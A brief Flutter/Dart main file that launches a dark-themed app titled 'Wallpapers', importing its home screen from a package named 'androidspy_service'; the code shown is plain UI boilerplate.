import 'package:flutter/material.dart';
import 'package:androidspy_service/wallpaper/screen.dart';

void main() => runApp(WallpaperApp());

class WallpaperApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: "Wallpapers",
      theme: ThemeData.dark(),
      home: Screen(),
    );
  }
}